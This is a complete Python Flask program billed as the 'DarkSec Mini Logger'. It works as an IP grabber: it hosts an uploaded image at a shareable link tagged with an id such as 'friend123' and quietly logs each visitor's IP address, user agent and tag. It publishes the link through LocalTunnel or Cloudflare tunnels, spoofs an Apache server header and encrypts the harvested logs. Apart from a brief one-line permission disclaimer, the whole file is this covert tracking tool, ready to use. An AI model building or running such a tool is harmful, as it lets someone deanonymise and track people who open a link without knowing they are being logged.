#!/usr/bin/env python3
# DarkSec Mini Logger – Web (Mobile-Optimized) Edition
# Now with LocalTunnel + Cloudflare Tunnel (TryCloudflare) controls
# Features: Flask admin (responsive), Proxy-IP, Bot Filter, AES-256 enc/dec, LT + CF tunnels
# Use only on systems you own or have explicit permission to test.

import os, sys, time, json, base64, hashlib, re, secrets, string, subprocess, shutil
from pathlib import Path
from io import BytesIO
from datetime import datetime
from typing import Optional

from flask import Flask, request, redirect, url_for, send_file, Response, render_template_string, jsonify

# ---- Optional Crypto (PyCryptodome) ----
HAS_CRYPTO = True
try:
    from Crypto.Cipher import AES
except Exception:
    HAS_CRYPTO = False

APP_TITLE   = "DarkSec Mini Logger – Web"
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = int(os.environ.get("DARKSEC_PORT", "5000"))

# State
UPLOAD_DIR = Path("uploads"); UPLOAD_DIR.mkdir(exist_ok=True)
selected_image: Optional[Path] = None
log_buffer = []           # in-memory log lines
MAX_LOG_LINES = 5000

# Tunnels
lt_proc: Optional[subprocess.Popen] = None
lt_url:  Optional[str] = None
cf_proc: Optional[subprocess.Popen] = None
cf_url:  Optional[str] = None

# ---- Helpers ----
def _kdf(pw: str) -> bytes:
    return hashlib.sha256(pw.encode()).digest()

def encrypt_logs(data: str, pw: str) -> bytes:
    key = _kdf(pw)
    cipher = AES.new(key, AES.MODE_EAX)
    ct, tag = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(cipher.nonce + tag + ct)

def decrypt_logs_blob(b64: bytes, pw: str) -> Optional[bytes]:
    try:
        raw = base64.b64decode(b64)
        nonce, tag, ct = raw[:16], raw[16:32], raw[32:]
        key = _kdf(pw)
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag)
    except Exception:
        return None

def _content_type_for(path: str) -> str:
    p = path.lower()
    if p.endswith(".png"): return "image/png"
    if p.endswith(".gif"): return "image/gif"
    if p.endswith(".jpg") or p.endswith(".jpeg"): return "image/jpeg"
    if p.endswith(".webp"): return "image/webp"
    return "application/octet-stream"

BOT_UA = re.compile(
    r"(facebookexternalhit|Twitterbot|Slackbot|TelegramBot|Discordbot|WhatsApp|"
    r"LinkedInBot|SkypeUriPreview|Applebot|Pinterest|Google-InspectionTool|"
    r"VKShare|Qwantify|Snapchat|redditbot|bot|crawler|spider)",
    re.I
)

def add_log(line: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    out = f"[{ts}] {line}".rstrip("\n")
    log_buffer.append(out + "\n")
    # trim
    if len(log_buffer) > MAX_LOG_LINES:
        del log_buffer[: len(log_buffer) - MAX_LOG_LINES]

def rand_subdomain(prefix="dsec", n=6):
    alphabet = string.ascii_lowercase + string.digits
    return prefix + ''.join(secrets.choice(alphabet) for _ in range(n))

def parse_any_url(line: str, host_part: str) -> Optional[str]:
    m = re.search(r"https://[^\s]*" + re.escape(host_part), line)
    return m.group(0) if m else None

# ---- Flask app ----
app = Flask(__name__)

MOBILE_TEMPLATE = """
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{{ title }}</title>
<style>
  :root { --bg:#0b0b0b; --fg:#e6ffe6; --accent:#35e; --ok:#24c36b; --warn:#ffcc00; --err:#ff4d4d; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; }
  header { padding: 14px 12px; border-bottom: 1px solid #222; }
  h1 { margin:0; font-size: 20px; }
  .wrap { padding: 12px; max-width: 980px; margin: 0 auto; }
  .grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
  @media(min-width:860px){ .grid { grid-template-columns: 1fr 1fr; } }
  .card { background:#121212; border:1px solid #222; border-radius: 10px; padding: 12px; }
  .card h2 { margin: 0 0 8px; font-size: 16px; }
  .row { display:flex; gap:8px; flex-wrap: wrap; }
  .btn { display:inline-block; padding:12px 14px; font-weight:600; border-radius:10px; border:none; color:#000; background:#ddd; text-decoration:none; text-align:center; }
  .btn:active { transform: translateY(1px); }
  .btn-ok { background: var(--ok); }
  .btn-warn { background: var(--warn); }
  .btn-err { background: var(--err); color:#111; }
  .btn-alt { background:#2b2b2b; color:#fff; border:1px solid #444; }
  input[type="text"], input[type="file"], input[type="password"] { width: 100%; background:#0f0f0f; color:var(--fg); border:1px solid #333; border-radius:8px; padding:10px; }
  label { font-size: 13px; opacity: .9; }
  .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 12px; white-space: pre-wrap; background:#0d0d0d; border:1px solid #222; padding:10px; border-radius:8px; height: 260px; overflow:auto; }
  .pill { padding:4px 8px; background:#202020; border:1px solid #353535; border-radius: 999px; font-size: 12px; display:inline-block; margin-right:6px; }
  .small { font-size: 12px; opacity:.8; }
</style>
<script>
async function refreshLogs(){
  try{
    const r = await fetch("/logs.json");
    const j = await r.json();
    const box = document.getElementById("logbox");
    box.textContent = j.logs.join("");
  }catch(e){}
}
setInterval(refreshLogs, 1500);
window.addEventListener('load', refreshLogs);
</script>
</head>
<body>
<header class="wrap">
  <h1>{{ title }}</h1>
  <div class="small">Share the image URL → <code>/img/&lt;filename&gt;?id=&lt;tag&gt;</code>. Bots are tagged; proxy IPs respected.</div>
</header>

<div class="wrap grid">

  <!-- Image -->
  <section class="card">
    <h2>1) Select / Upload Image</h2>
    <form action="/upload" method="post" enctype="multipart/form-data">
      <label>Choose image (jpg/png/gif/webp)</label>
      <input type="file" name="image" accept=".jpg,.jpeg,.png,.gif,.webp" required>
      <div class="row" style="margin-top:8px;">
        <button class="btn btn-ok" type="submit">Upload & Use</button>
        {% if image_name %}
          <span class="pill">Current: {{ image_name }}</span>
        {% endif %}
      </div>
    </form>
    {% if image_name and public_base %}
      <div style="margin-top:10px">
        <label>Shareable URL (tap to copy)</label>
        <input type="text" readonly value="{{ public_base }}/img/{{ image_name }}?id=friend123" onclick="this.select();document.execCommand('copy');">
      </div>
    {% endif %}
  </section>

  <!-- LocalTunnel -->
  <section class="card">
    <h2>2) LocalTunnel (Free Public URL)</h2>
    <form action="/lt/start" method="post" class="row">
      <input type="text" name="subdomain" placeholder="Optional subdomain (letters/numbers)">
      <button class="btn btn-ok" type="submit">Start LocalTunnel</button>
    </form>
    <form action="/lt/stop" method="post" style="margin-top:8px;">
      <button class="btn btn-err" type="submit">Stop LocalTunnel</button>
    </form>
    <div style="margin-top:8px;">
      <label>Current LT URL</label>
      <input type="text" readonly value="{{ lt_url or '' }}" onclick="this.select();document.execCommand('copy');">
      <div class="small">Requires Node & npm: <code>npm install -g localtunnel</code></div>
    </div>
  </section>

  <!-- Cloudflare Tunnel -->
  <section class="card">
    <h2>3) Cloudflare Tunnel (TryCloudflare)</h2>
    <form action="/cf/start" method="post" class="row">
      <button class="btn btn-ok" type="submit">Start Cloudflare Tunnel</button>
    </form>
    <form action="/cf/stop" method="post" style="margin-top:8px;">
      <button class="btn btn-err" type="submit">Stop Cloudflare Tunnel</button>
    </form>
    <div style="margin-top:8px;">
      <label>Current CF URL</label>
      <input type="text" readonly value="{{ cf_url or '' }}" onclick="this.select();document.execCommand('copy');">
      <div class="small">Install: macOS <code>brew install cloudflared</code> · Debian/Ubuntu <code>sudo apt install cloudflared</code></div>
    </div>
  </section>

  <!-- Encrypt -->
  <section class="card">
    <h2>4) Encrypt Logs (Download)</h2>
    <form action="/encrypt" method="post" class="row">
      <input type="password" name="password" placeholder="Password" required>
      <button class="btn btn-ok" type="submit">Encrypt & Download</button>
    </form>
    <div class="small" style="margin-top:6px;">Uses AES-256 (EAX). Install <code>pycryptodome</code>.</div>
  </section>

  <!-- Decrypt -->
  <section class="card">
    <h2>5) Decrypt Logs (Upload)</h2>
    <form action="/decrypt" method="post" enctype="multipart/form-data" class="row">
      <input type="file" name="file" accept=".enc,.log.enc" required>
      <input type="password" name="password" placeholder="Password" required>
      <button class="btn btn-ok" type="submit">Decrypt & Download .txt</button>
    </form>
  </section>

  <!-- Doctor -->
  <section class="card">
    <h2>6) Dependency Doctor</h2>
    <form action="/doctor" method="post">
      <button class="btn btn-alt" type="submit">Run Doctor</button>
    </form>
    <div class="mono" style="margin-top:8px;" id="doctorBox">{{ doctor or 'Click "Run Doctor" to check environment...' }}</div>
  </section>

  <!-- Logs -->
  <section class="card">
    <h2>Live Logs</h2>
    <div class="mono" id="logbox">Loading…</div>
  </section>

</div>

</body>
</html>
"""

# ---------- Routes ----------

@app.route("/")
def home():
    return render_template_string(
        MOBILE_TEMPLATE,
        title=APP_TITLE,
        image_name=(selected_image.name if selected_image else None),
        lt_url=lt_url,
        cf_url=cf_url,
        public_base=(cf_url or lt_url or f"http://{request.host}"),
        doctor=None
    )

@app.route("/logs.json")
def logs_json():
    return jsonify({"logs": log_buffer[-2000:]})

@app.route("/upload", methods=["POST"])
def upload():
    global selected_image
    f = request.files.get("image")
    if not f or not f.filename:
        return redirect(url_for("home"))
    # Basic extension guard
    ext = f.filename.lower().split(".")[-1]
    if ext not in {"jpg","jpeg","png","gif","webp"}:
        return "Unsupported file type", 400
    dest = UPLOAD_DIR / f.filename
    # If name exists, uniquify
    idx = 1
    while dest.exists():
        dest = UPLOAD_DIR / f"{Path(f.filename).stem}_{idx}.{ext}"
        idx += 1
    f.save(dest)
    selected_image = dest
    add_log(f"[*] Image selected: {dest}")
    return redirect(url_for("home"))

@app.route("/img/<path:fname>")
def track_image(fname):
    """
    Tracking endpoint: serves chosen image and logs IP/UA/ID with proxy awareness.
    """
    if not selected_image or selected_image.name != fname:
        add_log(f"[!] 404 for /img/{fname}")
        return Response("<h1>404 Not Found</h1>", status=404, content_type="text/html; charset=utf-8")

    # IP detection via proxy headers
    xff = request.headers.get("X-Forwarded-For")
    xri = request.headers.get("X-Real-IP")
    origin_ip = (xff.split(",")[0].strip() if xff else None) or (xri.strip() if xri else None)
    client_ip = origin_ip or request.remote_addr or "0.0.0.0"

    ua = request.headers.get("User-Agent", "Unknown")
    is_bot = bool(BOT_UA.search(ua))
    tag = "BOT" if is_bot else "HUMAN"

    click_id = request.args.get("id", "")

    add_log(f"[{tag}] IP: {client_ip} | UA: {ua} | PATH: {request.path}?{request.query_string.decode()} | ID: {click_id}")

    try:
        data = selected_image.read_bytes()
        return Response(
            data,
            headers={
                "Content-Type": _content_type_for(str(selected_image)),
                "Server": "Apache/2.4.41 (Ubuntu)",
                "Cache-Control": "max-age=86400, private",
                "Content-Length": str(len(data)),
                "Vary": "User-Agent, X-Forwarded-For",
            },
            status=200,
        )
    except Exception:
        return Response(b"Internal Server Error", status=500)

# ---------- LocalTunnel ----------

@app.route("/lt/start", methods=["POST"])
def lt_start():
    global lt_proc, lt_url
    if lt_proc and lt_proc.poll() is None:
        return redirect(url_for("home"))
    lt_bin = shutil.which("lt")
    if not lt_bin:
        add_log("[WARN] LocalTunnel not found. Install: npm install -g localtunnel")
        return redirect(url_for("home"))

    sub = request.form.get("subdomain", "").strip()
    if not sub:
        sub = rand_subdomain()

    args = [lt_bin, "--port", str(LISTEN_PORT), "--subdomain", sub]
    lt_proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    add_log("[*] Starting LocalTunnel…")
    # read a few lines to capture URL
    for _ in range(200):
        line = lt_proc.stdout.readline()
        if not line: break
        add_log(line.strip())
        url = parse_any_url(line, ".loca.lt")
        if url:
            lt_url = url
            add_log(f"[*] LocalTunnel URL: {lt_url}")
            break
    return redirect(url_for("home"))

@app.route("/lt/stop", methods=["POST"])
def lt_stop():
    global lt_proc, lt_url
    if lt_proc and lt_proc.poll() is None:
        try: lt_proc.terminate()
        except Exception: pass
    lt_proc = None
    lt_url = None
    add_log("[*] LocalTunnel stopped")
    return redirect(url_for("home"))

# ---------- Cloudflare Tunnel (TryCloudflare) ----------

@app.route("/cf/start", methods=["POST"])
def cf_start():
    global cf_proc, cf_url
    if cf_proc and cf_proc.poll() is None:
        return redirect(url_for("home"))
    cf_bin = shutil.which("cloudflared")
    if not cf_bin:
        add_log("[WARN] cloudflared not found. Install: macOS 'brew install cloudflared' · Debian/Ubuntu 'sudo apt install cloudflared'")
        return redirect(url_for("home"))

    args = [cf_bin, "tunnel", "--url", f"http://localhost:{LISTEN_PORT}", "--no-autoupdate"]
    cf_proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    add_log("[*] Starting Cloudflare Tunnel…")
    for _ in range(300):
        line = cf_proc.stdout.readline()
        if not line: break
        add_log(line.strip())
        url = parse_any_url(line, "trycloudflare.com")
        if url:
            cf_url = url
            add_log(f"[*] Cloudflare URL: {cf_url}")
            break
    return redirect(url_for("home"))

@app.route("/cf/stop", methods=["POST"])
def cf_stop():
    global cf_proc, cf_url
    if cf_proc and cf_proc.poll() is None:
        try: cf_proc.terminate()
        except Exception: pass
    cf_proc = None
    cf_url = None
    add_log("[*] Cloudflare Tunnel stopped")
    return redirect(url_for("home"))

# ---------- Encrypt / Decrypt ----------

@app.route("/encrypt", methods=["POST"])
def encrypt_download():
    if not HAS_CRYPTO:
        return "pycryptodome not installed", 400
    pw = request.form.get("password", "")
    if not pw:
        return redirect(url_for("home"))
    payload = "".join(log_buffer)
    if not payload:
        return "No logs to encrypt", 400
    blob = encrypt_logs(payload, pw)
    return send_file(
        BytesIO(blob),
        mimetype="application/octet-stream",
        as_attachment=True,
        download_name=f"darksec_logs_{int(time.time())}.log.enc"
    )

@app.route("/decrypt", methods=["POST"])
def decrypt_upload():
    if not HAS_CRYPTO:
        return "pycryptodome not installed", 400
    f = request.files.get("file")
    pw = request.form.get("password", "")
    if not f or not pw:
        return redirect(url_for("home"))
    data = f.read()
    plain = decrypt_logs_blob(data, pw)
    if plain is None:
        return "Decryption failed (wrong password or corrupted file).", 400
    return send_file(
        BytesIO(plain),
        mimetype="text/plain; charset=utf-8",
        as_attachment=True,
        download_name=f"darksec_logs_decrypted_{int(time.time())}.txt"
    )

# ---------- Doctor ----------

def doctor_report() -> str:
    msgs = []
    def ok(s): msgs.append(f"[OK] {s}")
    def warn(s): msgs.append(f"[WARN] {s}")
    def fail(s): msgs.append(f"[FAIL] {s}")

    ok(f"Python {sys.version.split()[0]}")
    if HAS_CRYPTO: ok("PyCryptodome installed")
    else: fail("PyCryptodome missing → python3 -m pip install pycryptodome")

    node = shutil.which("node")
    npm  = shutil.which("npm")
    lt   = shutil.which("lt")
    cf   = shutil.which("cloudflared")

    if node: ok(f"node found: {node}")
    else: warn("node missing → macOS: brew install node | Debian/Ubuntu: sudo apt install nodejs")
    if npm: ok(f"npm found: {npm}")
    else: warn("npm missing → macOS: brew install npm | Debian/Ubuntu: sudo apt install npm")

    if lt: ok(f"localtunnel found: {lt}")
    else: warn("LocalTunnel missing → npm install -g localtunnel")

    if cf: ok(f"cloudflared found: {cf}")
    else: warn("cloudflared missing → macOS: brew install cloudflared | Debian/Ubuntu: sudo apt install cloudflared")

    if selected_image: ok(f"Image selected: {selected_image.name}")
    else: warn("No image selected yet.")

    if lt_url: ok(f"LocalTunnel active: {lt_url}")
    else: warn("LocalTunnel not running.")

    if cf_url: ok(f"Cloudflare active: {cf_url}")
    else: warn("Cloudflare not running.")

    return "\n".join(msgs)

@app.route("/doctor", methods=["POST"])
def doctor():
    add_log("[*] Running Dependency Doctor")
    rep = doctor_report()
    # Re-render with doctor text
    return render_template_string(
        MOBILE_TEMPLATE,
        title=APP_TITLE,
        image_name=(selected_image.name if selected_image else None),
        lt_url=lt_url,
        cf_url=cf_url,
        public_base=(cf_url or lt_url or f"http://{request.host}"),
        doctor=rep
    )

# ---------- Main ----------

if __name__ == "__main__":
    print(f"[*] {APP_TITLE}")
    print(f"[*] Admin UI:  http://127.0.0.1:{LISTEN_PORT}/  (or http://<your-ip>:{LISTEN_PORT}/ from phone)")
    if not HAS_CRYPTO:
        print("[!] pycryptodome not installed; encryption/decryption will be disabled.")
    try:
        app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False)
    except KeyboardInterrupt:
        pass